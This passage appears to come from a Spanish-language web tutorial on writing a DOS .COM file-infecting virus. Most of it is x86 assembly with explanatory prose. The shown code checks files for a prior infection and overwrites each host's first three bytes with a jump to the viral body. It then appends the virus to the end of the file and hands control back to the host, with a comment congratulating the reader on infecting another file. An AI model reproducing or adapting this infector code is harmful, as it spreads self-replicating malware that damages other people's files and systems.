+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; bx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;guardo el handel
+
+
+&nbsp;&nbsp;&nbsp;&nbsp; Al encontrar un archivo con extensi&oacute;n com lo abro para ver si est&aacute;
+&nbsp;&nbsp;&nbsp;&nbsp; contaminado.
+&nbsp;&nbsp;&nbsp;&nbsp; Ten en cuenta que la informaci&oacute;n obtenida con la funcion 4fh de la
+&nbsp;&nbsp;&nbsp;&nbsp; interrupci&oacute;n 21 (busqueda de archivo) se guarda en el DTA(disk
+&nbsp;&nbsp;&nbsp;&nbsp; transfer area) que forma parte del PSP (que son los 100 bytes iniciales
+&nbsp;&nbsp;&nbsp;&nbsp; del segmento donde se ejecuta el com).
+&nbsp;&nbsp;&nbsp;&nbsp; El DTA empieza en el offset 80h y tiene la siguiente estructura:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bytes ocupados&nbsp;&nbsp; Funci&cent;n
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 21d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Usado por el dos para la funci&oacute;n
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4f (buscar proximo)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 01d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Atributos del file encontrado
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 16h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 02d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hora del archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 18h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 02d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fecha del file
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1Ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 04d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tama&ntilde;o del archivo en bytes
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1Eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Nombre del archivo
+
+&nbsp;&nbsp;&nbsp; Ahora que sabemos esto para abrir un archivo encontrado con las funciones
+&nbsp;&nbsp;&nbsp; 4Eh y 4Fh s&oacute;lo tenemos que poner en dx la direcci&oacute;n del campo Nombre de
+&nbsp;&nbsp;&nbsp; Archivo del DTA. Esta se encuentra en el offset 1Eh del DTA pero como el
+&nbsp;&nbsp;&nbsp; DTA se encuentra en el offset 80h, la direcci&oacute;n real
+&nbsp;&nbsp;&nbsp; ser&aacute; 80h+1Eh= 9Eh.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4200h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;muevo el puntero&nbsp; al principio
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx,0000h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx,0000h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx,3h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;longitud a copiar&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; dx,[bp+cab_Orig]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;direccion donde se copiara
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah,3fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;funcion de lectura
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; En la variable cab_ORIG los 3 primeros byte del archivo . Esto
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; es para comprobar si est&aacute;&nbsp; infectado y si lo est&aacute;&nbsp; de paso ya tengo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; los 3 bytes para poder recuperarlos luego.(ten en cuenta que a estas
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alturas ya hemos recuperado en memoria los 3 bytes originales del
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; file).
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah ,3eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;cierro el archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp&nbsp;&nbsp;&nbsp;&nbsp; byte ptr [bp+cab_ORIG],0E9h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;si empieza con un jmp&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; otro&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;no lo contamina y busca otro
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cierro el archivo y compruebo si el byte almacenado en cab_ORIG es
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; igual a 0E9h que es el c&oacute;digo de la intrucci&oacute;n jmp.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Si es igual probablemente est&eacute; contaminado por lo que buscamos otro
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax, 3d02h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;abro el archivo para r/w
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx, 009eh
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; word ptr ds:[bp+handel],ax ;guardo en handel en la variable
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; bx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; guardo en bx el handle del archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fijate bien que todas las referencias a variables se realizan sumando
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bp.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx, 2h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; si,009Ah
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; di,[bp+cabecera+1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rep&nbsp;&nbsp;&nbsp;&nbsp; movsb
+
+&nbsp;&nbsp;&nbsp;&nbsp; Ahora hallamos el tama&ntilde;o del archivo , lo leemos del DTA como ya hicimos
+&nbsp;&nbsp;&nbsp;&nbsp; con el nombre del archivo
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp;&nbsp;&nbsp;&nbsp; word ptr [bp+cabecera+1],3&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ahora resto al tama&ntilde;o del archivo lo que ocupa el tama&ntilde;o del jmp (3 bytes)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ya que el salto comienza realmente desde la siguiente instrucci&oacute;n.
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4200h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;muevo el puntero&nbsp; al principio
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx,0000h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx,0000h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;escribo los nuevos 3 bytes
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; cx,3h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;que tendr&aacute; el archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; dx,bp+cabacera
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Que conste que la variable cabecera la ten&iexcl;a preparada con un E9h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; en el primer bytes(jmp) mirar la definici&oacute;n de variables del final
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Por ello lo &uacute;nico que he tenido que hacer es completarla metiendo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la direcci&oacute;n hallada.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; ax,4202h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;muevo el puntero al final
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; cx,0000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; dx,0000h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; 21h
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; ah,40h
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; cx,longitud&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;en cx el n&uacute;mero de bytes a copiar
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; dx,bp+start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;pues la longitud del archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;que va a ser
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah ,3eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;cierro el archivo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h
+
+&nbsp;&nbsp;&nbsp;&nbsp; Completamos la infecci&oacute;n cerrando el archivo
+
+salir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; di&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp; DESAPILO LOS REGISTROS
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;FELICIDADES YA HAS CONTAMINADO OTRO ARCHIVO
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; ax
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Para salir desapilamos los registros guardados
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; y con un simple jmp al offset 100h el hoste emp</pre>
+
+</body>
+</html>
